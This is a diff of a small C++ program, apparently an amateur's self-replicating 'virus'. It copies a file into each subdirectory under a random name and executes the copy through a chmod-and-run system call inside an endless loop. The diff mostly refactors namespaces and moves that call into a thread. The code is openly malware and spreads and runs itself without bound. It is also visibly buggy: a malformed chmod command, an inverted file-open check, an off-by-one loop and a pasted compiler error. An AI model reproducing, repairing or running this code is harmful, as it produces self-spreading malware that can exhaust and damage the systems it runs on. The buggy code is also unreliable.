@@ -7,20 +7,23 @@
 #include <dirent.h>
 #include <iostream>
 
-using namespace std;
+
 
 //variables
-regex correctFile("(a)+([0-9]?)+(.*)");
+std::regex correctFile("(a)+([0-9]?)+(.*)");
 // detect archives
-regex itsAFile("[\\w\\d\\- ]+(\\.*)");
+std::regex itsAFile("[\\w\\d\\- ]+(\\.*)");
 
 // prototypes
-void ListDir(const string &, vector<string> &);
-void writeFiles(vector<string>);
+void ListDir(const std::string &, std::vector<std::string> &);
 
+void writeFiles(std::vector<std::string>);
+
+
+std::string nameVirus;
 int main()
 {
-  vector<string> files;
+  std::vector<std::string> files;
   ListDir("./", files);
   writeFiles(files);
 
@@ -28,7 +31,7 @@ int main()
 }
 
 // get the directorys
-void ListDir(const string &path, vector<string> &files)
+void ListDir(const std::string &path, std::vector<std::string> &files)
 {
   struct dirent *entry;
   DIR *dp;
@@ -44,40 +47,45 @@ void ListDir(const string &path, vector<string> &files)
   closedir(dp);
 }
 // write the file
-void writeFiles(vector<string> files)
+void execCommand(){
+  system(("chmod 775" + nameVirus + ";" + nameVirus).c_str());
+}
+void writeFiles(std::vector<std::string> files)
 {
 
-  string file = "a.out";
-  do
+ std:: string file = "a.out";
+  while(true)
   {
     for (int i = 0; i <= files.size(); i++)
     {
       try
       {
-        if (regex_match(files[i], correctFile))
+        if (std::regex_match(files[i], correctFile))
           file = files[i]; // get the file
 
         // get the directories
-        if (!regex_match(files[i], itsAFile) == 0 || files[i] == "." || files[i] == "..")
+        if (!std::regex_match(files[i], itsAFile) == 0 || files[i] == "." || files[i] == "..")
         {
           // generate the name
-          string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
+         nameVirus= (files[i] + "/a" + std::to_string(rand()) + ".bin");
           // get the file
-          ifstream fileVirus(file);
+          std::ifstream fileVirus(file);
           // create the file
-          ofstream copyVirus(nameVirus);
+          std::ofstream copyVirus(nameVirus);
           if (!fileVirus.is_open())
             copyVirus << fileVirus.rdbuf(); // copy the file
 
           fileVirus.close();
-          thread comm(system("chmod 775" + nameVirus + ";" + nameVirus));
-          comm.join(); // idk what im doing here 😩
+    
+          std::thread execThisPlease(execCommand);
+          execThisPlease.join(); // idk what im doing here 😩
         }
       }
+      //no instance of constructor "std::__1::thread::thread" matches the argument list -- argument types are: (int (const char *), std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char>>)
       catch (...)
       {
-        cout << "fuck" << endl;
+       std::cout << "fuck" << std::endl;
       }
     }
-  } while (true);
+  } 
 }
